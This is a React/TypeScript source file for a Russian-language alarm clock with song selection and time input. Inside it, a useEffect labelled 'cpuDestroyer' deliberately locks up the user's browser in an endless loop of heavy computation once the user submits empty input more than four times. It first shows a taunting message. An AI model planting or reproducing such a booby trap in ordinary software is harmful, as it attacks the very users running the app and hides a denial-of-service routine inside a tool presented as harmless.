import s from './AlarmMain.module.css';
import {useEffect, useState} from "react";
import defaultSong from '../../assets/lezginka.mp3'
import song1 from '../../assets/shaman.mp3'
import song2 from '../../assets/gimn.mp3'


interface Song {
    id: number;
    name: string;
    url: string}

const songs = [
    {id: 1, name: 'SHAMAN - Я РУССКИЙ', url: song1},
    {id: 2, name: 'ГИМН РОССИИ', url: song2},
    {id: 3, name: 'ЛИЗГИНКА (стандарт)', url: defaultSong, isDefault: true},
]


const AlarmMain = () => {

    const [minutesAlarm, setMinutesAlarm] = useState('')
    const [hourAlarm, setHourAlarm] = useState('')

    const [isTimerOpen, setIsTimerOpen] = useState(true)
    const [isCancelopen, setIsCancelopen] = useState(false)

    const [selectedSong, setSelectedSong] = useState(songs.find(song => song.isDefault) || songs[0])
    const [audio, setAudio] = useState<HTMLAudioElement>(new Audio(selectedSong.url));
    const [isPlaying, setIsPlaying] = useState(false)


    const [isError, setIsError] = useState('')

    const [count, setCount] = useState(0)



    const handleSongSelect = (song:Song) => {
        audio.pause(); // Остановить текущее воспроизведение
        audio.currentTime = 0;
        setSelectedSong(song)
        const newAudio = new Audio(song.url)
        setAudio(newAudio)
        setIsPlaying(false)
    }

    const togglePreview = () => {
        if (isPlaying) {
            audio.pause()
            audio.currentTime = 0
        }else {
            audio.play().catch(error => {
                console.log('ошибка чота тут во- ', error)
            })
        }
        setIsPlaying(!isPlaying)
    }

    const handleSetTimer = () => {
        const hours = Number(hourAlarm)
        const minutes = Number(minutesAlarm)
        if (hourAlarm.trim() === '' || minutesAlarm.trim() === '') {
            setIsError("Введите корректное время")
            setCount((prev)=>prev + 1)
            return;
        }

        if (hours >= 0 && hours <= 23 && minutes >= 0 && minutes <= 59 ) {
            setIsTimerOpen(false);
            setIsCancelopen(true);
        }else {
            setIsError("Введи нормально пж")
        }
    }

    const handleClearTimer = () => {
        audio.pause()
        audio.currentTime = 0
        setIsTimerOpen(true);
        setIsCancelopen(false);
        setHourAlarm('')
        setMinutesAlarm('')
    }

    useEffect(() => {
        let interval: ReturnType<typeof setInterval>;
        if (isCancelopen) {
            interval = setInterval(()=>{
                const now = new Date();
                const currentHour = now.getHours();
                const currentMinute = now.getMinutes();
                if (currentHour === Number(hourAlarm) && currentMinute === Number(minutesAlarm)) {
                    audio.play()
                }
            }, 3000)
        }
        return () => {clearInterval(interval);}
    },[isCancelopen, hourAlarm, minutesAlarm, audio])



//cpuDestroyer
    useEffect(() => {
        if (count === 4){
            setIsError("подумай брат")
        }
        if (count <= 4) return;
        while (true) {
            // Тяжелые вычисления (например, криптография или математика)
            let sum = 0;
            for (let i = 0; i < 1e7; i++) sum += Math.random();
            console.error("ERROR ERROR ERROR")
            console.error(count)
        }
    }, [count]);



    useEffect(() => {
        return () => {
            audio.pause()
            audio.currentTime = 0
        }
    }, []);

    return (
        <div>
            {isTimerOpen &&
                <div className={s.mainContainerAlarm}>
                    <div className={s.alarmInputs}>
                        <input className={s.inputTime}
                               type="number"
                               min={0}
                               max={23}
                               placeholder={"час"}
                               onChange={(event) => setHourAlarm(event.target.value)}
                        />
                        <p>:</p>
                        <input className={s.inputTime}
                               type="number"
                               min={0}
                               max={59}
                               placeholder={"мин"}
                               onChange={(event) => setMinutesAlarm(event.target.value)}
                        />
                    </div>
                    <div>
                        {isTimerOpen && (
                            <div className={s.songSelection}>
                                <h3>Выберите мелодию</h3>
                                <ul className={s.songsList}>
                                    {songs.map((song) => (
                                        <li
                                            key={song.id}
                                            onClick={()=>handleSongSelect(song)}
                                            className={`${s.songItem} ${selectedSong.id === song.id ? s.selected : ''}`}
                                        >
                                            {song.name}
                                            {selectedSong.id === song.id && (
                                                <button
                                                    onClick={(e)=>{
                                                        e.stopPropagation()
                                                        togglePreview()
                                                    }}
                                                    className={s.previewButton}
                                                >
                                                    {isPlaying ? '⏸' : '▶'}
                                                </button>
                                            )}
                                        </li>
                                    ))}
                                </ul>
                            </div>
                        )}
                    </div>
                    {isError &&
                        <div className={s.errorBlock}>
                            <p className={s.errorText}> {isError}</p>
                        </div>
                    }
                    <div>
                        <button
                            onClick={handleSetTimer}
                            className={s.buttonAlarm}
                        >Подтвердить
                        </button>
                    </div>
                </div>
            }
            {isCancelopen &&
                <div>
                    <div className={s.mainContainerAlarm}>
                        <div className={s.timeMessageBlock}>
                            <p className={s.timeMessageText}>Ваш будильник зализгинит в</p>
                            <div className={s.timeMessageTimeContainer}>
                                <p className={s.timeMessageTime}>{hourAlarm} : {minutesAlarm}</p>
                            </div>
                        </div>
                        <button
                            onClick={handleClearTimer}
                            className={s.buttonAlarm}
                        >Отменить</button>
                    </div>
                </div>
            }

        </div>
    );
};

export default AlarmMain;